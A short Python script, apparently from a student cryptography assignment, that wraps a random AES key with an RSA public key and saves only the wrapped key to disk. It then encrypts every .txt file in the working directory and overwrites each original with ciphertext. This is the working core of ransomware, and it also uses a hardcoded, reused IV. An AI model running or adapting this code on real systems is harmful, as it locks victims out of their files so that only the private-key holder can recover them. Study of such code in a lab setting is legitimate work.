
import glob
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

"""
k = get_random_bytes(16)
print(k)
pk = RSA.import_key(open("receiver.pem").read())
file_out = open("Ck.bin", "wb")
cipher_rsa = PKCS1_OAEP.new(pk)
Ck = cipher_rsa.encrypt(k)
file_out.write(Ck)
file_out.close()


M = b"4 more days to assignment 1"

cipher = AES.new(k, AES.MODE_CBC)
CM_bytes = cipher.encrypt(pad(M,AES.block_size))
iv = b64encode(cipher.iv).decode('utf-8')
CM = b64encode(CM_bytes).decode('utf-8')
"""

"""
with open('iv', 'w') as file:
    # Write some content to the file
    file.write(iv)

print('iv='+iv,'ct='+ CM)
"""
k = get_random_bytes(16)
#	print(k)
pk = RSA.import_key(open("receiver.pem").read())
file_out = open("Ck.bin", "wb")
cipher_rsa = PKCS1_OAEP.new(pk)
Ck = cipher_rsa.encrypt(k)
file_out.write(Ck)
file_out.close()
for item in glob.glob("*.txt"):

	with open(item, 'r') as file:
    		content = file.read()
#	print(content)
	content_bytes = content.encode('utf-8')

	iv =b'H\xd7v1\x16\xa6\x88GQ\xaehE>0!\x86'
	cipher = AES.new(k, AES.MODE_CBC,iv)
	CM_bytes = cipher.encrypt(pad(content_bytes,AES.block_size))
	CM = b64encode(CM_bytes).decode('utf-8')
#	print(cipher.iv)
	with open(item, 'w') as file:
	    # Write some content to the file
	    file.write(CM)
	    

#	print('iv='+iv,'ct='+ CM)


